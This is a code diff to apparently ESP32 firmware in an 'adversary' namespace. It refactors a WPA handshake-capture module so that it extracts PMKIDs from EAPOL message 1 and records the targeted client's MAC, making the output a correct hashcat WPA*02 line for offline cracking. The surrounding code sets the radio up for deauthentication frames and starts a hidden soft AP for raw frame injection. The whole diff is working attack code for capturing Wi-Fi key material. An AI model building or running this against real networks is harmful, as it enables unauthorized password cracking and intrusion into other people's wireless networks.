@@ -5,6 +5,7 @@
 
 #include "handshake_capture.h"
 #include "../../utils/wifi_utils.h"
+#include "../../utils/pmkid_utils.h"  // Pure, unit-tested PMKID extraction
 #include "../attack/deauth.h"  // For unified deauth utilities
 
 #ifdef ESP32
@@ -236,7 +237,7 @@ bool HandshakeCapture::start(const HandshakeCaptureConfig& config) {
     // Use AP+STA mode - required for deauth transmission
     WiFi.mode(WIFI_AP_STA);
     delay(100);
-    
+
     // Start hidden soft AP on target channel (required for raw frame TX)
     WiFi.softAP("adversary_hs", nullptr, config_.channel, 1);  // Hidden AP
     delay(100);
@@ -481,7 +482,7 @@ void HandshakeCapture::processEAPOL(const uint8_t* data, uint16_t length, int8_t
     switch (msg) {
         case HandshakeMessage::MSG1:
             stats_.msg1Count++;
-            processMessage1(eapolStart, eapolLen, data, length);
+            processMessage1(eapolStart, eapolLen, data, length, clientMac);
             break;
         case HandshakeMessage::MSG2:
             stats_.msg2Count++;
@@ -523,7 +524,8 @@ void HandshakeCapture::setState(HandshakeState newState) {
 }
 
 void HandshakeCapture::processMessage1(const uint8_t* eapolData, uint16_t eapolLen,
-                                        const uint8_t* frameData, uint16_t frameLen) {
+                                        const uint8_t* frameData, uint16_t frameLen,
+                                        const uint8_t* clientMac) {
     if (eapolLen < 99) return;
     
     // Extract ANonce (32 bytes at offset 17 in EAPOL-Key)
@@ -540,18 +542,13 @@ void HandshakeCapture::processMessage1(const uint8_t* eapolData, uint16_t eapolL
     uint16_t keyInfo = (keyFrame[1] << 8) | keyFrame[2];
     handshake_.keyDescVer = keyInfo & KEY_INFO_DESC_VER_MASK;
     
-    // Try to extract PMKID from M1 Key Data (RSN IE)
-    // Key Data Length is at offset 93 (2 bytes, big-endian) in EAPOL-Key
-    // Key Data starts at offset 95
-    if (eapolLen >= 99) {
-        uint16_t keyDataLen = (keyFrame[91] << 8) | keyFrame[92];
-        const uint8_t* keyData = keyFrame + 93;
-        
-        // Search for PMKID in RSN IE within Key Data
-        // PMKID format: OUI=00-0F-AC, Type=4, followed by 16-byte PMKID
-        if (keyDataLen > 0 && (93 + keyDataLen) <= (eapolLen - 4)) {
-            extractPMKID(keyData, keyDataLen);
-        }
+    // Extract a clientless-crackable PMKID when the AP put a PMKID KDE in M1's
+    // Key Data. The hashcat WPA*02 line is keyed on the supplicant MAC the AP
+    // used (PMKID = HMAC-SHA1(PMK, "PMK Name" | AP | STA)), so the station is the
+    // client M1 was addressed to, not our own MAC.
+    uint8_t pmkid[utils::PMKID_LENGTH];
+    if (utils::extractPmkidFromEapol(eapolData, eapolLen, pmkid)) {
+        recordPmkid(pmkid, clientMac);
     }
     
     // Update state (order-independent)
@@ -831,66 +828,31 @@ bool HandshakeCapture::extractClientMac(const uint8_t* frame, uint8_t* clientMac
     return true;
 }
 
-void HandshakeCapture::extractPMKID(const uint8_t* keyData, uint16_t keyDataLen) {
-    // PMKID is found in the RSN PMKID-List within Key Data of M1
-    // RSN IE format: Tag(1) + Length(1) + Version(2) + GroupCipher(4) + 
-    //                PairwiseCnt(2) + Pairwise(4*n) + AKMCnt(2) + AKM(4*n) + 
-    //                RSNCaps(2) + PMKIDCnt(2) + PMKID(16*n)
-    // 
-    // We're looking for PMKID KDE (Key Data Encapsulation):
-    // Type=0xDD, Length, OUI(00-0F-AC), DataType(4=PMKID), PMKID(16 bytes)
-    
-    if (keyDataLen < 22) return;  // Minimum for PMKID KDE
-    
-    for (uint16_t i = 0; i < keyDataLen - 22; ) {
-        uint8_t tag = keyData[i];
-        uint8_t len = keyData[i + 1];
-        
-        if (i + 2 + len > keyDataLen) break;  // Prevent overflow
-        
-        // Check for PMKID KDE: 0xDD (vendor-specific), OUI=00-0F-AC, Type=4
-        if (tag == 0xDD && len >= 20) {
-            // Check OUI: 00-0F-AC (IEEE 802.11)
-            if (keyData[i + 2] == 0x00 && 
-                keyData[i + 3] == 0x0F && 
-                keyData[i + 4] == 0xAC &&
-                keyData[i + 5] == 0x04) {  // Type 4 = PMKID
-                
-                // Found PMKID! Copy it
-                pmkid_.reset();
-                memcpy(pmkid_.pmkid, keyData + i + 6, 16);
-                memcpy(pmkid_.bssid, config_.targetBssid, 6);
-                strncpy(pmkid_.ssid, config_.targetSsid, 32);
-                pmkid_.ssid[32] = '\0';
-                
+void HandshakeCapture::recordPmkid(const uint8_t* pmkid, const uint8_t* clientMac) {
+    pmkid_.reset();
+    memcpy(pmkid_.pmkid, pmkid, utils::PMKID_LENGTH);
+    memcpy(pmkid_.bssid, config_.targetBssid, 6);
+    // The AP computed this PMKID over the station M1 was addressed to, so the
+    // hashcat STA MAC must be that client, not our own device MAC.
+    memcpy(pmkid_.staMac, clientMac, 6);
+    strncpy(pmkid_.ssid, config_.targetSsid, 32);
+    pmkid_.ssid[32] = '\0';
+    hasPMKID_ = true;
+
 #ifdef ESP32
-                pmkid_.timestamp = millis();
-                // Get our own MAC as station MAC
-                esp_wifi_get_mac(WIFI_IF_STA, pmkid_.staMac);
-                
-                LOG_I("HS", "PMKID captured! %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
-                    pmkid_.pmkid[0], pmkid_.pmkid[1], pmkid_.pmkid[2], pmkid_.pmkid[3],
-                    pmkid_.pmkid[4], pmkid_.pmkid[5], pmkid_.pmkid[6], pmkid_.pmkid[7],
-                    pmkid_.pmkid[8], pmkid_.pmkid[9], pmkid_.pmkid[10], pmkid_.pmkid[11],
-                    pmkid_.pmkid[12], pmkid_.pmkid[13], pmkid_.pmkid[14], pmkid_.pmkid[15]);
+    pmkid_.timestamp = millis();
+    LOG_I("HS", "PMKID captured for %s (client %02X:%02X:%02X:%02X:%02X:%02X)",
+          pmkid_.ssid, clientMac[0], clientMac[1], clientMac[2],
+          clientMac[3], clientMac[4], clientMac[5]);
 #endif
-                hasPMKID_ = true;
-                
-                // Publish PMKID captured event
-                EventData pmkidEvt(EventType::PMKID_CAPTURED);
-                strncpy(pmkidEvt.payload.handshake.ssid, pmkid_.ssid, 32);
-                memcpy(pmkidEvt.payload.handshake.bssid, pmkid_.bssid, 6);
-                pmkidEvt.payload.handshake.channel = handshake_.channel;
-                pmkidEvt.payload.handshake.type = 1; // PMKID
-                EventBus::getInstance().publish(pmkidEvt);
-                return;
-            }
-        }
-        
-        // Move to next element
-        i += 2 + len;
-        if (len == 0) i++;  // Prevent infinite loop on zero-length
-    }
+
+    // Publish PMKID captured event
+    EventData pmkidEvt(EventType::PMKID_CAPTURED);
+    strncpy(pmkidEvt.payload.handshake.ssid, pmkid_.ssid, 32);
+    memcpy(pmkidEvt.payload.handshake.bssid, pmkid_.bssid, 6);
+    pmkidEvt.payload.handshake.channel = handshake_.channel;
+    pmkidEvt.payload.handshake.type = 1; // PMKID
+    EventBus::getInstance().publish(pmkidEvt);
 }
 
 } // namespace adversary
